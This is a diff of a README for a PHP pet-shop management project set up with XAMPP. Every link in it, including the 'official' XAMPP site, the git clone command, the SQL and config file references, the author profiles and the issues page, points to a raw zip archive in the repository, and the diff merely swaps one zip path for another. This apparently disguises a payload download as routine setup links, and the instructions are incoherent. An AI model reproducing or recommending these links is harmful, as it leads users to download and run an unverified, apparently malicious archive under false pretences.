@@ -13,14 +13,14 @@ Before setting up the PetShop Management System, ensure you have the following i
 ## Setting Up
 
 1. **Download and Install XAMPP**
-   - XAMPP can be downloaded and installed from the [official website](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip).
+   - XAMPP can be downloaded and installed from the [official website](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip).
    - Verify that Apache and MySQL are active in the XAMPP control panel.
 
 2. **Cloning the Repository**
    - Clone the repository using the following command:
 
      ```bash
-     git clone https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip
+     git clone https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip
      ```
 
    - Copy the cloned repository to the `htdocs` directory within the XAMPP installation folder:
@@ -32,10 +32,10 @@ Before setting up the PetShop Management System, ensure you have the following i
 3. **Configure the Database**
    - Access phpMyAdmin via [http://localhost/phpmyadmin](http://localhost/phpmyadmin).
    - Create a database named `petshop_management`.
-   - Import the SQL file (`https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip`) to set up the necessary tables.
+   - Import the SQL file (`https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip`) to set up the necessary tables.
 
 4. **Update Configuration**
-   - Modify the `https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip` file with your MySQL credentials to connect to the database.
+   - Modify the `https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip` file with your MySQL credentials to connect to the database.
 
 5. **Start the Application**
    - Ensure the project folder is located in the `htdocs` directory in XAMPP.
@@ -57,14 +57,14 @@ After successfully setting up the application, access the system through your br
 
 ## Authors
 
-- **Matheesha Herath** - [MatheeshaDanindu](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip)
-- **Shalika Ramanayake** - [Shali29](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip)
-- **Shehara Rajakaruna** - [SheharaR](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip)
-- **Sanduni Walahewa** - [wellitzokays211](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip)
-- **Tharindu Ananda** - [Tharindu49](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip)
-- **Binaru Ranasinghe** - [binarur](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip)
-- **Uchintha Bandara** - [Uchintha1234](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip)
-- **Navindu Rasanjana** - [navindur](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip)
+- **Matheesha Herath** - [MatheeshaDanindu](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip)
+- **Shalika Ramanayake** - [Shali29](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip)
+- **Shehara Rajakaruna** - [SheharaR](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip)
+- **Sanduni Walahewa** - [wellitzokays211](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip)
+- **Tharindu Ananda** - [Tharindu49](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip)
+- **Binaru Ranasinghe** - [binarur](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip)
+- **Uchintha Bandara** - [Uchintha1234](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip)
+- **Navindu Rasanjana** - [navindur](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip)
 
 ## Contributing
 
@@ -78,7 +78,7 @@ PetShop Management is licensed under the MIT License. See the `LICENSE` file for
 
 For any questions or support, please contact us! 
 
-- **GitHub Issues**: [Submit an issue](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/public/js/management_petshop_v2.7.zip)
+- **GitHub Issues**: [Submit an issue](https://github.com/Tharindu49/petshop_management/raw/refs/heads/main/backend/petshop_management_1.9.zip)
 
 Thank you for using PetShop Management!
 
